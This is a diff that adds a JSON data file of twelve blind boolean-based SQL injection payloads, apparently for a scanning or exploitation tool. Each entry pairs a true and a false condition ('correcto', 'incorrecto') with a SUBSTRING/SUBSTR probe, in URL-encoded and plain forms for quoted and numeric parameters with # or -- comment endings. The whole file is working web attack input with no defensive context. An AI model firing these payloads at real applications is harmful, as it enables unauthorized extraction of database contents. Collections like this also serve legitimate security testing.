@@ -1,0 +1,62 @@
+[
+    {
+        "correcto":"%27+AND+1%3D1%23",
+        "incorrecto":"%27+AND+1%3D0%23",
+        "payload":"%27+AND+SUBSTRING%28'bbb'%2C1%2C1%29+%3D+%27b"
+    },
+    {
+        "correcto":"%27+AND+1%3D1--",
+        "incorrecto":"%27+AND+1%3D0--",
+        "payload":"%27+AND+SUBSTR%28'bbb'%2C1%2C1%29+%3D+%27b"
+    },
+    {
+        "correcto":"' AND 1=1#",
+        "incorrecto":"' AND 1=0#",
+        "payload":"' AND SUBSTRING('bbb',1,1)='b"
+    },
+    {
+        "correcto":"' AND 1=1--",
+        "incorrecto":"' AND 1=0--",
+        "payload":"' AND SUBSTR('bbb',1,1)='b"
+    },
+    {
+        "correcto":"1+AND+1%3D1%23",
+        "incorrecto":"1+AND+1%3D0%23",
+        "payload":"1+AND+SUBSTRING%28'bbb'%2C1%2C1%29+%3D+%27b%27%23"
+    },
+    {
+        "correcto":"1+AND+1%3D1--",
+        "incorrecto":"1+AND+1%3D0--",
+        "payload":"1+AND+SUBSTR%28'bbb'%2C1%2C1%29+%3D+%27b%27--"
+    },
+    {
+        "correcto":"1 AND 1=1#",
+        "incorrecto":"1 AND 1=0#",
+        "payload":"1 and substring('bbb',1,1)='b'#"
+    },
+    {
+        "correcto":"1 AND 1=1--",
+        "incorrecto":"1 AND 1=0--",
+        "payload":"1 AND SUBSTR('bbb',1,1)='b'--"
+    },
+    {
+        "correcto":"1'+AND+1%3D1%23",
+        "incorrecto":"1'+AND+1%3D0%23",
+        "payload":"1'+AND+SUBSTRING%28'bbb'%2C1%2C1%29+%3D+%27b%27%23"
+    },
+    {
+        "correcto":"1'+AND+1%3D1--",
+        "incorrecto":"1'+AND+1%3D0--",
+        "payload":"1'+AND+SUBSTR%28'bbb'%2C1%2C1%29+%3D+%27b%27--"
+    },
+    {
+        "correcto":"1' AND 1=1#",
+        "incorrecto":"1' AND 1=0#",
+        "payload":"1' and substring('bbb',1,1)='b'#"
+    },
+    {
+        "correcto":"1' AND 1=1--",
+        "incorrecto":"1' AND 1=0--",
+        "payload":"1' AND SUBSTR('bbb',1,1)='b'--"
+    }
+]
